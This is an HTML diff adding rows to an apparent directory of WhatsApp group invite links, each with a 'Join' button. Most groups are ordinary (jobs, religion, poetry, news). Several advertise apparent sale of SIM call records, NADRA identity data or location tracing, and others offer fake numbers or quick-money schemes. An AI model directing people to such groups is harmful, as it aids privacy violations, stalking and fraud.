+                       window.open('../../external.html?link=https://chat.whatsapp.com/HEcKzKTCLLW1IZsa4Lw0w3'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ishq</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KGe355mAG3PJs7GmJE3TZI'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>دین اسلام</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CmuTLj0sf114sRGMyqrMZ5'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Friends chatting</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GGxOtarcvDZ9ohigkx3x3i'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sad deep feeling</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KIRudkvY3xP8INA4dYjGLf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Youtube tips</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D72OcGtpDlUKAFZqdkW5mA'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Govt Jobs Pakistan Gp-2</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BHSX7LPbenV12UJUccSYNk'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Govt Jobs Pakistan Gp-3</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ei5fcN95BPMFyPaRhuKHeJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Govt Jobs Pakistan Gp-1</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IRlLbmH7pXcAhKvMB9XvhB'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ppsc fpsc books plateform</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Lb7oB5nZplMCXbyqtxLgMJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ppsc fpsc books plateform</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Lb7oB5nZplMCXbyqtxLgMJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>SiM DATA TRACKERS</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IPrrqZBEJKd6Rz2S7NIamY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>You tube Copyright work</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/F0wAQ2kjJzzJWUkoattdaR'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Backbenchers</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GSf5Q5AkG5n4pst0E6cVuG'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>HIDDEN CHOICE ONLINE SHOPPING </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ILZ42oiQb7U3AIVxpW3Qd7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Only sad video</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/C6D3LqEbBu36GoSCsQbIwZ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Darwaysh.com </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/C3D8ZZIbQtVAKbGmebyosC'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Buy & Sale and Online Earning pakistan </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GNyMBS9pCXoApMrpzhZxBw'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sootta</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/G0Rm7kUW5EiJtIHDBzeAVd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Poetry group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DQ0Yi3EOD8L64JqorqZccT'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Bussnies </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DE9QFpvQ2xx2i0TCrcg801'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Prpal adisence company </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LOyaisHNAS0EcvQzEKym8C'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Education tech</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GGxOtarcvDZ9ohigkx3x3i'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Forex training courses</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LrSwM0OiVwSAuwgKbCf1aT'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Job magazine All today job</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L5HC2cvqYUI2mIKkE88kFk'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Sports</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KspWcZxsrCPHG5pl8P2PM5'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>All SIM Network data CDR Nadra data group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FQ69gStRa6J2mToR2uWyCy'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>1️⃣ DAILY ILM E DEEN</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ivl8TAecvh9KB8tjV6DQXI'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>5️⃣ DAILY URDU NOVEL</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CV3hDdG2B86JHd7SaQ2oPg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online shoping</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CgNgPoRJ60DEjdq2Eo3BAr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Buy & sail pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CI0pAPYhenbHTFqKMC8OJf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>JOBS UpDaTes.</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LY7fp2Zg3uFICvAAHiblEg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Buy & sail pakistain</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CI0pAPYhenbHTFqKMC8OJf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>♥ جوَن ایلیا 📙</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KCLQEa0Tz1z86uhiv5zSGh'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Be friendly 😍</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GmIgDcuaSmX0r6xCFBgL7O'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>General knowledge</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IRpMqtnFKrHKB7xChM5ltO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islam</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BxU51ejxLoID4236KXkA1W'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>islam</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/J8gl92LhTiRHzDg6b13QLD'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Jazz free internet tricks</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BEv2ApvYgaM42hSMigQdMx'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🌍~ Worldwide Friends ~💌</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GK8BjLtJSobIhWU0znXgZv'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online earning </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FERu8VUiKy1GLCnYjRo0Aj'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>News update  only pakistan </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CHjP7bEuyzJF71WMrOo6Uf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Friendz zone</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CHjP7bEuyzJF71WMrOo6Uf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Links viewer </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HOzaD1NgV1nInYwD1yBYwV'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>قرآن وحدیث</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CgFnRjNW1C37zJmvpxqyUB'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>𝔰𝔲𝔭𝔢𝔯꧁ꊰ꒤ꋊꉣꄲ꒐ꋊ꓄꧂๖ۣۜℋค℘℘ℽ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ke5o8QxDyqNKNuiqLuT1av'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islamic information group </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/G4sRePKyfaTIJB8VwkzRcZ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>کرلس عثمان سیزن 2 اردو</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L5GalJpmyFbIda1Gdrwvks'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Silsala payar ka he </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IrGTxf4xXI5IfKkhkVMWeA'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Free cryptocurrency trade </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Hd2rcWge9HEHEi2SJmV8UO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sydo ngo</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GrDmrwpsurJAnxHDsgAA1Q'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Education tech</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GGxOtarcvDZ9ohigkx3x3i'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Report Corona and News updated </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://www.pak24tv.com/ chat whatsapp.come/FYKun8nqgH61RN6er5Mpee'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Cricket update.</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JY4Z5ZztAub4lSD4EIp6FO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🄺🄽🄾🅆🄻🄴🄳🄶🄴2️⃣</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HlsOHwdfMAlEtQXGPAxKNg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online earning pakistan </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/G7bDP3BzsyC5CkZX1EgneP'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Book urdu</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/H3KoUi6iH6yIiu6qIy2hPY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mikhana ishq</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GuT37B5NiS75R8jAbTkqxN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mobiles</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DstKabXWtHW4Hr3lr3o68F'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>King Pakistani</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JJEVVnNViUu0bDiHymStUG'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn money with B4U</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/K7mnRWeT0g903Q0py0fEVi'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i> 💞 تاجدارِ ختمِ نبوت ﷺ💞</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ESP2cWPnnZl2Mtm26FWtka'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i> Ajnabi per Apna Sa</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ELdlrLlIO1yGugimwxHxNo'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tiktok and instagram followers</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/J1d4DaKP5rr2Ppp0fn9HVc'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Paskitan 🇵🇰</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GbA31QYYt8sBf8l8Nb0BHI'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sad girls friendship join group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IrGTxf4xXI5IfKkhkVMWeA'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Heart borken</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Co30tXzI2Sa4Pz0dZUihTe'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ashiq janoon</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/F7YLL0pmv3ZKse5rzG9sUf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Gujranwala Mobile</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FJc4WyMwJ3uJMZhbhdPYC7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islamic tehreers</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DBnwo7vuLCUL7xMaxzY3mN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Deta sim</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GXlUpNmZie53ECFRPEeM4v'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Urdu shary</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DzFofcISmziIcbwKRWjPaB'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pak24tv</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CPeSq8MAwQBDeUIXHZhKdf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Make Money Online</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LqHq4LSgHBMJTEDQzn4TyJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Lasani oil traders</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Hr1rxQm7p1FI2V4eYPByT3'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Lasani group of companies</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LmtczheLIWa1h4PMQWVg8g'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>tiktok</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/E74byyjgxLf1ssKZBQI9k3'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>jobsalert & preparation</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L6pv1iFL8gx4MCOqfHoZw1'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>jobsalert & preparation</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CLs6HWrPaKn38Y2iprIaFh'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islam is Best </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EHl75BxFFct4yX8zi4r31z'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ISLAMIC GROUP</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IfMzPhMTaK08II9rs1lqqs'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>𝔼🇳​𝙏𝙀ℝTི🇦​Ĩ🇳​Mི🅴N🇹​ 𝙂𝙍𝙊𝙐𝙋</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JJeUkz4yzKD37AjAcRsvNq'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>pindipoint</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D6Y1jzJGZSFClQb0iEgVkp'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pak army</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JrLoKPRBqZlLw1w7OYxP77'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>All Sim Detail CDR </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open(' ../../external.html?link=https://chat.whatsapp.com/BUU1p4HTif41GPUrVuxvmS'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mirza Uc Shop</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CYJxHdMDw2uInCGiK5lyoW'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online shopping cash on delivery </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/J3PzNxcpyE09QPI8gwrXcO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Job magazine All today job</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L5HC2cvqYUI2mIKkE88kFk'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Information Group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Kwq44J4RsiwEGXHEM5HY2y'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Khushab Dhodha Booking</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/B9GDN7ufG7QHC3z45Zfs95'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Only sad video</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/K5imm0KbN6PEAE2Fnikt3g'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>jobsalert & preparation</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L6pv1iFL8gx4MCOqfHoZw1'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>jobsalert & preparation</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CLs6HWrPaKn38Y2iprIaFh'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Only sad video</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HDjhQtmX2vY0s7EFiBC5bO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>آدھورئ محبت</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EEbhpvMVBzG15PBTlaLkFe'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mian Law Associates(Civil.Family.Criminal)</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CkxrWf3lQjs6zNQV28P7yX'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Get Free USD Group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EQX3ZhCf26K7bjZneu9v0c'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Al_Barakah selling Market</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FK4kY31c7qQ6MUTKuOsRQ8'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pindi boy Hadi Rahi</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ITNJfDxOJ4tJ4KQcdUGoka'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Ëäŕńįñg</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D18wV4nO3OZBacAwyNSlAE'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Fake Whatsapp Number🇱🇷</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BEN8ZPw0bEi9anNBaLCmQO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Photo Editor Pro</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ef1AvQ8Fq4MBB4yDQIf2AH'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>☝دینِِ حق☝</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Iml4SO75ZSB0YC6qTOiVTc'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>سولمیکس🏆 سےگھر🏠بیٹھے لاکھوں📱کماؤ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HDSia3ZYT8V7tqQN3BjVXN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Youtuber </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JJEVVnNViUu0bDiHymStUG'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Only sad video</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KYDXCC8cfnI0EVYoJmX3tP'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sales center</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EOAK4sxaEkZ7Iss0KMXDpl'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🇰‌🇳‌🇴‌🇼‌🇱‌🇪‌🇩‌🇬‌🇪‌</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HlsOHwdfMAlEtQXGPAxKNg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 1️⃣ </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ERonfAcGu9EIzGgYk5BRc5'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 2️⃣ </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HlsOHwdfMAlEtQXGPAxKNg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>✌یاراں دا گروپ ✔️</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GE5ZHvY1kMh8vfVwgso8c7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sim deta location trace cdr </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GXlUpNmZie53ECFRPEeM4v'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>News funny sports</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LGCNHSIhudfJLhspr5dlt7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>playstation digital account</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/InHFXbUzq048pa5ZIA2G4I'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>All network secret data</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/I8CmBaxj29KJdGnaitmFD1'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mobile qiston per Multan lahore sahiwal bahwalpur</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KfxMZlAGlGSLhC5vPUUjHR'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🎤 voice group 🎤</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EyZR68hIJnDKFcbqcVHgcy'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Fun ka funda </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/7n6kGlNMqWo1mautbRmU9F'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>online earning in Pakistan without investment </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DLwM8115as10w5cTpP8YXO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn money with B4U</i></td>
+<td><button class="btn btn-success" onclick="
